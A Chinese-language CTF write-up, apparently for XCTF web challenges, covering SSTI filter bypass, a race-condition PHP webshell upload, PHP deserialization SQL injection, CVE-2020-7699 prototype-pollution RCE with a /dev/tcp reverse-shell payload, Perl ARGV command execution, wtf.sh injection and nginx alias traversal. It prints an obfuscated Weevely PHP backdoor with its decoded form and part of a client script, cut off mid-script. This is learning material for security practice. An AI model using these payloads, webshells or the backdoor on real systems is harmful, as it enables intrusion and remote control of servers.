上面先试着访问`file:///etc/passwd` 回显 我们尝试直接读取flag`flie:///flag`回显hack 说明有过滤，我们直接用url编码的flag访问`file:///%66%6c%61%67` 出现flag ![image-20250130130436846](image-20250130130436846.png) ## easy_web 尝试sql注入发现不行 bp抓包看框架是python，想到SSTI 但是手动测试了一些字符被过滤，而这里是字符规范器，通过特殊字符来绕过 { -\u0026gt; ︷/﹛ } -\u0026gt; ︸/﹜ \u0026rsquo; -\u0026gt; ＇ , -\u0026gt; ， \u0026quot; -\u0026gt; ＂\n1 2 3 4 5 用万能payload替换 ```python {{a.__init__.__globals__.__builtins__.eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;ls\u0026#39;).read()\u0026#34;)}} 替换脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026#34;\u0026#34;\u0026#34; { -\u0026gt; ︷/﹛ } -\u0026gt; ︸/﹜ \u0026#39; -\u0026gt; ＇ , -\u0026gt; ， \u0026#34; -\u0026gt; ＂ \u0026#34;\u0026#34;\u0026#34; //此时的str即你要输入的payload str = \u0026#39;\u0026#39;\u0026#39;{{a.__init__.__globals__.__builtins__.eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;ls\u0026#39;).read()\u0026#34;)}}\u0026#39;\u0026#39;\u0026#39; # 原字符串 # 如果需要替换replace(被替换的字符,替换后的字符) str = str.replace(\u0026#39;{\u0026#39;, \u0026#39;︷\u0026#39;) str = str.replace(\u0026#39;}\u0026#39;, \u0026#39;︸\u0026#39;) str = str.replace(\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;＇\u0026#39;) str = str.replace(\u0026#39;\\\u0026#34;\u0026#39;, \u0026#39;＂\u0026#39;) print(str) 或者老套路先查子类的父类，找有用的function\n1 {{[].__class__.__base__.__subclasses__()}} warnings在191\n1 {{[].__class__.__bases__[0].__subclasses__()[191].__init__.__globals__.__builtins__[\u0026#39;open\u0026#39;](\u0026#39;/etc/passwd\u0026#39;).read()}} 发现可以读出,直接读flag即可\n1 {{[].__class__.__bases__[0].__subclasses__()[191].__init__.__globals__.__builtins__[\u0026#39;open\u0026#39;](\u0026#39;/flag\u0026#39;).read()}} 或者用eval函数\n1 {{[].__class__.__bases__[0].__subclasses__()[191].__init__.__globals__.__builtins__[\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /flag\u0026#39;).read()\u0026#34;)}} wzsc_文件上传 上传php文件会显示上传成功，而查看upload目录却没有，怀疑是上传后就删除，用条件竞争上传\n条件竞争木马\n1 2 3 \u0026lt;?php fputs(fopen(\u0026#39;shell.php\u0026#39;,\u0026#39;w\u0026#39;),\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]) ?\u0026gt;\u0026#39;); ?\u0026gt; 然后用bp重复发包\n再用脚本重复访问\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 import requests import threading import os class RaceCondition(threading.Thread): def __init__(self): threading.Thread.__init__(self) self.url = \u0026#39;http://61.147.171.105:54711/upload/1.php\u0026#39; self.uploadUrl = \u0026#39;http://61.147.171.105:54711/upload/shell.php\u0026#39; def _get(self): print(\u0026#39;try to call uploaded file...\u0026#39;) r = requests.get(self.url) if r.status_code == 200: print(\u0026#39;[*] create file shell.php success.\u0026#39;) os._exit(0) def _upload(self): print(\u0026#39;upload file...\u0026#39;) rs = requests.get(self.uploadUrl) if rs.status_code == 200: print(\u0026#39;[*] create file shell.php success.\u0026#39;) os._exit(0) def run(self): while True: for i in range(5): self._get() for i in range(10): self._upload() self._get() if __name__ == \u0026#39;__main__\u0026#39;: threads = 50 for i in range(threads): t = RaceCondition() t.start() for i in range(threads): t.join() 然后访问shell.php,蚁剑连接\n题目名称-warmup 题目给了附件\n是界面源码\nconn.php定义类SQL，在后面加了waf，没有过滤单引号，要求username是admin\nindex.php中把cookie中last_login_info的值进行反序列化和base64，而且把username和password进行了转义过滤，而table没有过滤\n我们可以创建一个新的table，令他的列里面username为admin\npoc:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php class SQL{ public $table; public $username; public $password; public $conn; } $o=new SQL(); //要和表内的字段值一致 $o-\u0026gt;username=\u0026#39;admin\u0026#39;; $o-\u0026gt;password=\u0026#39;1\u0026#39;; //括号外的a是子查询表的名字 $o-\u0026gt;table=\u0026#34;(select \u0026#39;admin\u0026#39; username,\u0026#39;1\u0026#39; password)a\u0026#34;; echo base64_encode(serialize($o)); 上面的子查询被命名为 a。这意味着整个子查询的结果会被视为一个名为 a 的表。\n1 select username,password from (select \u0026#39;admin\u0026#39; username,\u0026#39;1\u0026#39; password)a where username=\u0026#39;admin\u0026#39; and password=\u0026#39;1\u0026#39; BadProgrammer 目录扫描\nstatic下可能有东西\n这个static../是利用了nginx源码泄露漏洞能看到源码\n查看app.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 const express = require(\u0026#39;express\u0026#39;); const fileUpload = require(\u0026#39;express-fileupload\u0026#39;); const app = express(); app.use(fileUpload({ parseNested: true })); app.post(\u0026#39;/4_pATh_y0u_CaNN07_Gu3ss\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;flag.ejs\u0026#39;); }); app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;index.ejs\u0026#39;); }) app.listen(3000); app.on(\u0026#39;listening\u0026#39;, function() { console.log(\u0026#39;Express server started on port %s at %s\u0026#39;, server.address().port, server.address().address); }); post访问//4_pATh_y0u_CaNN07_Gu3ss\n说flag在flag.txt中\n这边有express-fileupload,搜索到存在CVE-2020-7699漏洞\n查看package.json，express-fileupload版本为1.1.7,低于1.1.9存在漏洞\n漏洞原理：https://www.freebuf.com/vuls/246029.html\n反弹shell通用payload\n1 x;process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;bash -c \u0026#34;bash -i \u0026amp;\u0026gt; /dev/tcp/ip/prot 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;);x 用cp把flag复制到目录/app/static/js/flag.txt下\n1 x;process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;cp /flag.txt /app/static/js/flag.txt\u0026#39;);x 这里有两种办法\n一种构造请求包（直接抄）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 POST /4_pATh_y0u_CaNN07_Gu3ss HTTP/1.1 Host: 61.147.171.105:49310 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 289 Content-Type: multipart/form-data; boundary=---------------------------1546646991721295948201928333 -----------------------------1546646991721295948201928333 Content-Disposition: form-data; name=\u0026#34;__proto__.outputFunctionName\u0026#34; x;process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;cp /flag.txt /app/static/js/flag.txt\u0026#39;);x -----------------------------1546646991721295948201928333-- 然后访问目录即可\n另一种用脚本发包\n1 2 3 4 5 6 7 8 9 import requests resp1 = requests.post(\u0026#34;http://{}:{}/{}\u0026#34;.format(\u0026#39;61.147.171.105\u0026#39;, \u0026#39;49310\u0026#39;, \u0026#39;4_pATh_y0u_CaNN07_Gu3ss\u0026#39;), files={\u0026#39;__proto__.outputFunctionName\u0026#39;: ( None, \u0026#34;x;console.log(1);process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;{cmd}\u0026#39;);x\u0026#34;.format(cmd=\u0026#39;cp /flag.txt /app/static/js/flag.txt\u0026#39;) )}) print(resp1) i-got-id-200 进入场景后有3个链接，点进去都是.pl文件，.pl文件都是用perl编写的网页文件。\n尝试后发现，Files链接可以上传文件并把文件内容打印出来。猜想后台应该用了param()函数。\nparam()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的接收变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的。\n源码大概是这样\n1 2 3 4 5 6 7 8 use strict; use warnings; use CGI; my $cgi= CGI-\u0026gt;new; if ( $cgi-\u0026gt;upload( \u0026#39;file\u0026#39; ) ) { my $file= $cgi-\u0026gt;param( \u0026#39;file\u0026#39; ); while ( \u0026lt;$file\u0026gt; ) { print \u0026#34;$_\u0026#34;; } } bp随便上传文件抓包先复制boundary分割线\n把文件名filename删除\n上传ARGV\n然后在url后面拼接他的本地文件\n这里用bin/bash来执行命令\n1 2 3 4 5 ?/bin/bash -c ls /| 转码后?/bin/bash%20-c%20ls${IFS}/| 或者 用?ls -l / | 转码后?ls%20-l%20/%20| /bin/bash 一旦被访问输出，就是bash运行环境，整个语句的输出结果在shell的缓冲区里，也就是后台服务器才能看到，并不会输出到html标签中。在linux里我们只需要管道操作就可以指定结果的存放位置了。 Tips：Perl open()函数会默认打开一个管道！ 这里利用Perl open()函数打开的管道，进行劫持，通过“|“操作符，把内容引入open()函数已经打开的管道中，就可以输出到html标签中\n如果不拼接管道符是不会回显的，而且ls /中间的空格要用linux的空格替代，而不是%20这种url编码\n现在解释上传ARGV能读取任意文件的原理\n1 2 3 4 if ( $cgi-\u0026gt;upload( \u0026#39;file\u0026#39; ) ) { my $file= $cgi-\u0026gt;param( \u0026#39;file\u0026#39; ); while ( \u0026lt;$file\u0026gt; ) { print \u0026#34;$_\u0026#34;; } } 上面这段代码有漏洞\n1 2 3 4 5 6 7 首先，【if ($cgi-\u0026gt;upload(\u0026#39;file\u0026#39;)) {】这行代码中，我们期望upload()负责检查“file”参数值所代表的文件是否已上传，然而实际上upload()检查的是某一“file”参数值所代表的文件是否已上传（用户可构造多个file参数）。换句话说，upload()并不要求所有的file参数都是文件，它只要求其中一个file参数是文件即可。这意味着，我们可以构造2个file参数，一个上传文件，另一个赋一个变量值，这样也可以通过upload()的校验。 然后，【my file=cgi-\u0026gt;param(\u0026#39;file\u0026#39;);】这行代码中，我们期望param()返回上传文件的文件描述符，然而实际上，如果我们构造2个file参数，一个上传文件，另一个赋一个变量值。那么param()返回我们输入的所有file参数值的列表。但是file不能包含两个值，所以在给file赋值时，程序会取列表中的第一个值赋给file。所以如果给第一个file参数赋变量值，第二个file参数赋文件描述符，则file会被赋值为我们输入的变量值，而不是上传的文件描述符。这意味着，此时$file变成了一个常规字符串！ 接着，【while (\u0026lt;$file\u0026gt;) {】这行代码中，我们本来期望遍历文件的每一行，但由于此时$file是一个常规字符串，事实上，“\u0026lt;\u0026gt;”仅对文件起作用，对字符串不起作用。但是有一个特例，除非这个字符串是“ARGV”。当字符串是“ARGV”时，“\u0026lt;\u0026gt;”会遍历URL中？后面的每个值（比如POST /test.cgi?/etc/file1 /etc/file2），并把它们当做文件路径插入到一个open()调用中。这意味着，此时我们可以查看任何我们想看的文件内容，而不是仅仅查看我们上传的文件内容。 最后，再说说open()函数。open()的本意是打开一个字符串所代表的文件，但是当在字符串后面加一个“|”的话，open()就会执行这个字符串（比如POST /test.cgi?ipconfig|），就像调用一个exec()一样。 接着ARGV\n1 2 3 4 5 6 7 8 9 10 11 12 13 ARGV：遍历数组变量@ARGV中所有文件名的特殊文件句柄 @ARGV：是个全局数组特殊变量，传给脚本的命令行参数列表 Perl 会将perl命令行参数列表放入到数组@ARGV中，而默认情况下，这些命令行参数是Perl的数据输入源，也就是说Perl 会以依次将他们当作文件进行读取。这里可以参考C语言的argv{}数组，但不同的是， Perl语言的@ARGV中的第一个变量就是参数，而不是文件名。 Param() 函数会返回一个列表，但只有第一个文件会被放到变量中。 增加新的上传项，并删除filename，重大漏洞来了 删除filename后， $file的值（也就是文件名）变为了上传的内容，而输出的文件内容为空 通俗理解就是，新加入的文件内容替换了filename参数，传给了$file变量，\u0026lt;file\u0026gt;句柄中打开文件内容为空 那如果我们利用@ARGV，将$file替换为@ARGV，其句柄就是，就是命令行的参数呀，如果给的参数是文件名，就可以输出第一个文件名的所有内容。 这里我们利用以上信息构造，加入新的文件列表，删除filename，文件内容写入ARGV 那么后端执行，就会把$file的值换为ARGV，也就成了上述test.pl的内容，会把从命令行里读取到的参数，当作文件路径找到并输出。 那么如何传入命令行参数呢？其实直接在url给出参数就相当于命令行传参 那么，通过ARGV和url的参数就可以达到读取服务器上任意文件的目的 wtf.sh-150 注册和登入界面尝试sql注入没结果\n然后注册后点击任意界面发现有参数\n再次尝试sql注入没结果，试试目录穿越../\n查找flag\n发现这段源码\n1 $ if is_logged_in \u0026amp;\u0026amp; [[ \u0026#34;${COOKIES[\u0026#39;USERNAME\u0026#39;]}\u0026#34; = \u0026#39;admin\u0026#39; ]] \u0026amp;\u0026amp; [[ ${username} = \u0026#39;admin\u0026#39; ]] $ then $ get_flag1 $ fi $ fi 要是cookie中的USERNAME的值为admin，而且username为admin就能拿到flag1\n但是我们没有admin的密码或者admin的token\n界面里面有很多users目录\n我们继续目录穿越\n找到admin的相关信息\n1 Posted by admin ae475a820a6b5ade1d2e8b427b59d53d15f1f715 uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w== 进bp抓包看看\n发现现在这串确实是token\n然后我们伪造成admin登入\n在用户简介发现一半flag\nxctf{cb49256d1ab48803\n接着从界面源码继续找\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 max_page_include_depth=64 page_include_depth=0 function include_page { # include_page pathname local pathname=$1 local cmd= [[ ${pathname(-4)} = \u0026#39;.wtf\u0026#39; ]]; local can_execute=$; page_include_depth=$(($page_include_depth+1)) if [[ $page_include_depth -lt $max_page_include_depth ]] then local line; while read -r line; do # check if we\u0026#39;re in a script line or not ($ at the beginning implies script line) # also, our extension needs to be .wtf [[ $ = ${line01} \u0026amp;\u0026amp; ${can_execute} = 0 ]]; is_script=$; # execute the line. if [[ $is_script = 0 ]] then cmd+=$\u0026#39;n\u0026#39;${line#$}; else if [[ -n $cmd ]] then eval $cmd log Error during execution of ${cmd}; cmd= fi echo $line fi done ${pathname} else echo pMax include depth exceeded!p fi } 这里要求路径名的后缀必须是.wtf\n然后又找到一个reply功能的函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 function reply { local post_id=$1; local username=$2; local text=$3; local hashed=$(hash_username \u0026#34;${username}\u0026#34;); curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1); next_reply_id=$(awk \u0026#39;{print $1+1}\u0026#39; \u0026lt;\u0026lt;\u0026lt; \u0026#34;${curr_id}\u0026#34;); next_file=(posts/${post_id}/${next_reply_id}); echo \u0026#34;${username}\u0026#34; \u0026gt; \u0026#34;${next_file}\u0026#34;; echo \u0026#34;RE: $(nth_line 2 \u0026lt; \u0026#34;posts/${post_id}/1\u0026#34;)\u0026#34; \u0026gt;\u0026gt; \u0026#34;${next_file}\u0026#34;; echo \u0026#34;${text}\u0026#34; \u0026gt;\u0026gt; \u0026#34;${next_file}\u0026#34;; # add post this is in reply to to posts cache echo \u0026#34;${post_id}/${next_reply_id}\u0026#34; \u0026gt;\u0026gt; \u0026#34;users_lookup/${hashed}/posts\u0026#34;; } 功能是把用户名写进文件中\n如果用户名是一段可执行代码，而且写入的文件是 wtf 格式的，那么这个文件就能够执行我们想要的代码。 （而且wtf.sh只运行文件扩展名为.wtf的脚本和前缀为’$\u0026lsquo;的行）\n前面那个是get_flag1，不难想到后一个是get_flag2\n我们用${find,/,-iname,get_flag2}作为用户名来用reply功能\n上传的wtf文件名任意，但是要拼接水平制表符%09，不然后台会把我们的后门当做目录去解析\n上传1.wtf\n拿到目录\n接下来再注册一个账户$/usr/bin/get_flag2\n拿到后段flag，拼接即可\nxctf{cb49256d1ab48803149e5ec49d3c29ca}\nWeb_php_wrong_nginx_config 目录扫描\n有robots.txt\n打开hint.php提示我们配置文件也许有问题呀：/etc/nginx/sites-enabled/site.conf\n然后hack.php提示我们登入，我们抓包看信息\n把isLogin改为1\n只有管理中心能点\n抓包继续改为1\n出现file参数想到文件包含，要包含之前的nginx源码\n测试几次怀疑../被过滤，\n提示continue\n而./没有被过滤\n所以我们用\u0026hellip;/./双写替换../绕过\n并拼接前下的目录..././..././..././..././/etc/nginx/sites-enabled/site.conf\u0026amp;ext= 出现配置文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 server { listen 8080; ## listen for ipv4; this line is default and implied listen [::]:8080; ## listen for ipv6 root /var/www/html; index index.php index.html index.htm; port_in_redirect off; server_name _; # Make site accessible from http://localhost/ #server_name localhost; # If block for setting the time for the logfile if ($time_iso8601 ~ \u0026#34;^(\\d{4})-(\\d{2})-(\\d{2})\u0026#34;) { set $year $1; set $month $2; set $day $3; } # Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html sendfile off; set $http_x_forwarded_for_filt $http_x_forwarded_for; if ($http_x_forwarded_for_filt ~ ([0-9]+\\.[0-9]+\\.[0-9]+\\.)[0-9]+) { set $http_x_forwarded_for_filt $1???; } # Add stdout logging access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log; error_log /var/log/nginx/error.log info; location / { # First attempt to serve request as file, then # as directory, then fall back to index.html try_files $uri $uri/ /index.php?q=$uri\u0026amp;$args; server_tokens off; } #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html { root /usr/share/nginx/html; } location ~ \\.php$ { try_files $uri $uri/ /index.php?q=$uri\u0026amp;$args; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass unix:/var/run/php/php5.6-fpm.sock; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param SCRIPT_NAME $fastcgi_script_name; fastcgi_index index.php; include fastcgi_params; fastcgi_param REMOTE_ADDR $http_x_forwarded_for; } location ~ /\\. { log_not_found off; deny all; } location /web-img { alias /images/; autoindex on; } location ~* \\.(ini|docx|pcapng|doc)$ { deny all; } include /var/www/nginx[.]conf; 1 2 3 4 location /web-img { alias /images/; autoindex on; } 这里提示目录/web-img可以文件遍历、\n想到nginx的源码泄露漏洞\n用web-img../\n查找有用信息\n进var/www/发现hack.php的备份\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php $U=\u0026#39;_/|U\u0026#34;,\u0026#34;/-/|U\u0026#34;),ar|Uray|U(\u0026#34;/|U\u0026#34;,\u0026#34;+\u0026#34;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle\u0026#39;; $q=\u0026#39;s[|U$i]=\u0026#34;\u0026#34;;$p=|U$ss($p,3);}|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s)){$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui\u0026#39;; $M=\u0026#39;l=\u0026#34;strtolower|U\u0026#34;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$\u0026#39;; $z=\u0026#39;r=@$r[|U\u0026#34;HTTP_R|UEFERER|U\u0026#34;];$r|U|Ua=@$r[\u0026#34;HTTP_A|U|UCCEPT_LAN|UGUAGE|U\u0026#34;];if|U($r|Ur\u0026amp;|U\u0026amp;$ra){$u=parse_|Uurl($r\u0026#39;; $k=\u0026#39;?:;q=0.([\\\\|Ud]))?,|U?/\u0026#34;,$ra,$m)|U;if($|Uq\u0026amp;\u0026amp;$m){|U|U|U@session_start()|U|U;$s=\u0026amp;$_SESSIO|UN;$ss=\u0026#34;|Usubst|Ur\u0026#34;;|U|U$s\u0026#39;; $o=\u0026#39;|U$l;|U){for|U($j=0;($j|U\u0026lt;$c\u0026amp;\u0026amp;|U|U$i|U\u0026lt;$|Ul);$j++,$i++){$o.=$t{$i}|U^$k|U{$j};}}|Ureturn $|Uo;}$r=$|U_SERV|UE|UR;$r\u0026#39;; $N=\u0026#39;|Uf($e){$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(\u0026#34;/\u0026#39;; $C=\u0026#39;an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(\u0026#34;|U\u0026lt;$k\u0026gt;$d\u0026lt;/$k\u0026gt;\u0026#34;|U);@ses|U|Usion_des|Utroy();}}}}\u0026#39;; $j=\u0026#39;$k|Uh=\u0026#34;|U|U42f7\u0026#34;;$kf=\u0026#34;e9ac\u0026#34;;fun|Uction|U |Ux($t,$k){$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U\u0026#34;\u0026#34;;fo|Ur($i=0;$i\u0026lt;\u0026#39;; $R=str_replace(\u0026#39;rO\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;rOcreatrOe_rOrOfurOncrOtion\u0026#39;); $J=\u0026#39;kf|U),|U0,3));$p=\u0026#34;|U\u0026#34;;for(|U|U$|Uz=1;$z\u0026lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0){$\u0026#39;; $x=\u0026#39;r)|U;pa|Urse|U_str($u[\u0026#34;qu|U|Uery\u0026#34;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(\u0026#34;/([\\\\|U|Uw])[|U\\\\w-]+|U(\u0026#39;; $f=str_replace(\u0026#39;|U\u0026#39;,\u0026#39;\u0026#39;,$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C); $g=create_function(\u0026#39;\u0026#39;,$f); $g(); ?\u0026gt; 看起来是进行了混淆\n我们先运行看看echo$f看看原来的代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 $kh=\u0026#34;42f7\u0026#34;;$kf=\u0026#34;e9ac\u0026#34;;function x($t,$k){$c=strlen($k);$l=strlen($t);$o=\u0026#34;\u0026#34;;for($i=0;$i\u0026lt;$l;){for($j=0;($j\u0026lt;$c\u0026amp;\u0026amp;$i\u0026lt;$l);$j++,$i++){$o.=$t{$i}^$k{$j};}}return $o;}$r=$_SERVER;$rr=@$r[\u0026#34;HTTP_REFERER\u0026#34;];$ra=@$r[\u0026#34;HTTP_ACCEPT_LANGUAGE\u0026#34;];if($rr\u0026amp;\u0026amp;$ra){$u=parse_url($rr);parse_str($u[\u0026#34;query\u0026#34;],$q);$q=array_values($q);preg_match_all(\u0026#34;/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/\u0026#34;,$ra,$m);if($q\u0026amp;\u0026amp;$m){@session_start();$s=\u0026amp;$_SESSION;$ss=\u0026#34;substr\u0026#34;;$sl=\u0026#34;strtolower\u0026#34;;$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p=\u0026#34;\u0026#34;;for($z=1;$z\u0026lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];if(strpos($p,$h)===0){$s[$i]=\u0026#34;\u0026#34;;$p=$ss($p,3);}if(array_key_exists($i,$s)){$s[$i].=$p;$e=strpos($s[$i],$f);if($e){$k=$kh.$kf;ob_start();@eval(@gzuncompress(@x(@base64_decode(preg_replace(array(\u0026#34;/_/\u0026#34;,\u0026#34;/-/\u0026#34;),array(\u0026#34;/\u0026#34;,\u0026#34;+\u0026#34;),$ss($s[$i],0,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));print(\u0026#34;\u0026lt;$k\u0026gt;$d\u0026lt;/$k\u0026gt;\u0026#34;);@session_destroy();}}}} $kh=\u0026#34;42f7\u0026#34;; $kf=\u0026#34;e9ac\u0026#34;; function x($t,$k) { $c=strlen($k); $l=strlen($t); $o=\u0026#34;\u0026#34;; for ($i=0;$i\u0026lt;$l;) { for ($j=0;($j\u0026lt;$c\u0026amp;\u0026amp;$i\u0026lt;$l);$j++,$i++) { $o.=$t{$i}^$k{$j}; } } return $o; } $r=$_SERVER; $rr=@$r[\u0026#34;HTTP_REFERER\u0026#34;]; $ra=@$r[\u0026#34;HTTP_ACCEPT_LANGUAGE\u0026#34;]; if($rr\u0026amp;\u0026amp;$ra) { $u=parse_url($rr); parse_str($u[\u0026#34;query\u0026#34;],$q); $q=array_values($q); preg_match_all(\u0026#34;/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/\u0026#34;,$ra,$m); if($q\u0026amp;\u0026amp;$m) { @session_start(); $s=\u0026amp;$_SESSION; $ss=\u0026#34;substr\u0026#34;; $sl=\u0026#34;strtolower\u0026#34;; $i=$m[1][0].$m[1][1]; $h=$sl($ss(md5($i.$kh),0,3)); $f=$sl($ss(md5($i.$kf),0,3)); $p=\u0026#34;\u0026#34;; for ($z=1;$z\u0026lt;count($m[1]);$z++)$p.=$q[$m[2][$z]]; if(strpos($p,$h)===0) { $s[$i]=\u0026#34;\u0026#34;; $p=$ss($p,3); } if(array_key_exists($i,$s)) { $s[$i].=$p; $e=strpos($s[$i],$f); if($e) { $k=$kh.$kf; ob_start(); @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(\u0026#34;/_/\u0026#34;,\u0026#34;/-/\u0026#34;),array(\u0026#34;/\u0026#34;,\u0026#34;+\u0026#34;),$ss($s[$i],0,$e))),$k))); $o=ob_get_contents(); ob_end_clean(); $d=base64_encode(x(gzcompress($o),$k)); print(\u0026#34;\u0026lt;$k\u0026gt;$d\u0026lt;/$k\u0026gt;\u0026#34;); @session_destroy(); } } } } 直接用大佬Weevely：一个 PHP 混淆后门的代码分析 - Phuker\u0026rsquo;s Blog的poc,需要修改config，用python2运行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 # encoding: utf-8 # 注意修改 url , keyh , keyf 等参数 from random import randint,choice from hashlib import md5 import urllib import string import zlib import base64 import requests import re # 用于生成完整的 Accept-Language def choicePart(seq,amount): length = len(seq) if length == 0 or length \u0026lt; amount: print \u0026#39;Error Input\u0026#39; return None result = [] # 结果 indexes = [] # 索引 count = 0 while count \u0026lt; amount: i = randint(0,length-1) if not i in indexes: indexes.append(i) result.append(seq[i]) count += 1 if count == amount: return result # 生成随机填充字符串( 由所有 ASCII 字符组成 , 包括不可读的字符 ) def randBytesFlow(amount): result = \u0026#39;\u0026#39; for i in xrange(amount): result += chr(randint(0,255)) return result # 生成随机填充字符串( 由所有大小写字母组成 ) def randAlpha(amount): result = \u0026#39;\u0026#39; for i in xrange(amount): # choice() 方法返回一个列表，元组或字符串的随机项 # string.ascii_letters 会生成所有的字母 result += choice(string.ascii_letters) return result # 模拟 x() 函数 , 循环异或加密 def loopXor(text,key): result = \u0026#39;\u0026#39; lenKey = len(key) lenTxt = len(text) iTxt = 0 while iTxt \u0026lt; lenTxt: iKey = 0 while iTxt\u0026lt;lenTxt and iKey\u0026lt;lenKey: result += chr(ord(key[iKey]) ^ ord(text[iTxt])) iTxt += 1 iKey += 1 return result # 开启 Debug 选项 def debugPrint(msg): if debugging: print msg # 定义基本变量 debugging = False # 默认关闭 Debug , 可用 True 开启 keyh = \u0026#34;42f7\u0026#34; # $kh , 需要修改 keyf = \u0026#34;e9ac\u0026#34; # $kf , 需要修改 xorKey = keyh + keyf # $k url = \u0026#39;http://61.147.171.105:65362/hack.php\u0026#39; # 指定 URL , 需要修改 defaultLang = \u0026#39;zh-CN\u0026#39; #默认Language languages = [\u0026#39;zh-TW;q=0.%d\u0026#39;,\u0026#39;zh-HK;q=0.%d\u0026#39;,\u0026#39;en-US;q=0.%d\u0026#39;,\u0026#39;en;q=0.%d\u0026#39;] #Accept-Language 模板 proxies = None # {\u0026#39;http\u0026#39;:\u0026#39;http://127.0.0.1:8080\u0026#39;} # 代理 , 可用于 BurpSuite 等 sess = requests.Session() # 创建一个 SESSION 对象 # 每次会话会产生一次随机的 Accept-Language langTmp = choicePart(languages,3) # 输出一个列表 , 包含模板中的三种 Accept-language indexes = sorted(choicePart(range(1,10),3), reverse=True) # 降序排序输出三个权重值 , 例如 [8,6,4] acceptLang = [defaultLang] # 先添加默认Language for i in xrange(3): acceptLang.append(langTmp[i] % (indexes[i],)) # 然后循环添加三种 Accept-Language , 并为其添加权重值 acceptLangStr = \u0026#39;,\u0026#39;.join(acceptLang) # 将多个 Accept-Language 用 \u0026#34; , \u0026#34; 拼接在一起 # 